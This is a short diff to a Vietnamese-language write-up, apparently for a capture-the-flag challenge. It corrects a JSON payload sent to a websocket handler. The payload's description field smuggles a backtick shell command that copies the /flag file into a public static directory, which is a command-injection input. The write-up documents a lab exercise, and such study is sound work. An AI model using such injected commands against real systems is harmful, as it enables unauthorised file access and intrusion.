@@ -30,7 +30,7 @@ Dữ liệu này sẽ được xử lý ở wsHandler.js
 
 ## Payload
 
-{"action":"add","title":"a","description":"a /`cp /flag /ws/static/hung123.txt/`"}
+{"action":"add","title":"a","description":"a `cp /flag /ws/static/hung123.txt`"}
 
 ## Exploit ở local
 
